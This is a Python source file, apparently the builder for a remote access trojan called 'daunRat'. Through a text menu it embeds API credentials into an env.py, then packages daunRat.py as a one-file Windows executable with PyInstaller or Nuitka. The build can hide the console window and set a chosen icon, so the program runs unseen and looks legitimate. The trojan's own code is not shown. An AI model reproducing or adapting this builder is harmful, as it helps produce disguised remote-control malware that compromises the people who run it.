import os
import ezztui
import json

try:
    with open('settings.json') as f:
        settings = json.load(f)
    for i in ["icon", "app_id", "key", "secret", "cluster", "client_id", "terminal"]:
        if i not in settings:
            settings[i] = None
            with open('settings.json', 'w') as f:
                json.dump(settings, f)
except:
    settings = {
        "icon": "daun/ui/logo.ico",
        "app_id": "",
        "key": "",
        "secret": "",
        "cluster": "",
        "client_id": "",
        "terminal": "--windowed"
    }
    with open('settings.json', 'w+') as f:
        json.dump(settings, f)


def build(mode: str) -> None:
    with open('env.py', 'w') as f:
        f.write(f"""
app_id = "{settings["app_id"]}"
key = "{settings["key"]}"
secret = "{settings["secret"]}"
cluster = "{settings["cluster"]}"
client_id = "{settings["client_id"]}"
""")
    if mode == 'pyinstaller':
        os.system(f'venv\\Scripts\\activate.bat & pyinstaller --onefile --icon "{settings["icon"]}" '
                  f'{settings["terminal"]} --add-data "daun/modules;." daunRat.py')
        print(f"Output exe saved to {os.getcwd()}\\dist")
    elif mode == 'nuitka':
        os.system(f'venv\\Scripts\\activate.bat & '
                  f'nuitka --standalone --assume-yes-for-downloads --remove-output --disable-dll-dependency-cache '
                  f'--onefile --windows-icon-from-ico={settings["icon"]} '
                  f'{"--windows-disable-console" if settings["terminal"] == "--windowed" else ""} '
                  f'daunRat.py')
        print(f"Output exe saved to {os.getcwd()}")
    input("Press enter to continue...")


def update_settings(key: str, value: str) -> None:
    global settings
    settings[key] = value
    with open('settings.json', 'w+') as f:
        json.dump(settings, f)


while True:
    {
        "pyinstaller": lambda: build('pyinstaller'),
        "nuitka": lambda: build('nuitka'),
        "icon": lambda: update_settings("icon", input("icon path: ")),
        "app_id": lambda: update_settings("app_id", input("app_id: ")),
        "key": lambda: update_settings("key", input("key: ")),
        "secret": lambda: update_settings("secret", input("secret: ")),
        "cluster": lambda: update_settings("cluster", input("cluster: ")),
        "client_id": lambda: update_settings("client_id", input("client_id: ")),
        "hide": lambda: update_settings("terminal", "--windowed"),
        "show": lambda: update_settings("terminal", "--console")
    }[
        ezztui.menu({
            'build': {
                'pyinstaller': 'return',
                'nuitka': 'return',
                'back': 'back'
            },
            'settings': {
                'icon': 'return',
                'console visibility': {
                    'hide': 'return',
                    'show': 'return'
                },
                'api keys': {
                    f'app_id: {settings["app_id"]}': 'return',
                    f'key: {settings["key"]}': 'return',
                    f'secret: {settings["secret"]}': 'return',
                    f'cluster: {settings["cluster"]}': 'return',
                    f'client_id: {settings["client_id"]}': 'return',
                    'back': 'back'
                },
                'back': 'back'
            },
            'exit': {
                'exit': 'exit',
                'cancel': 'back'
            }
        }
        )[-1].split(':')[0]
    ]()
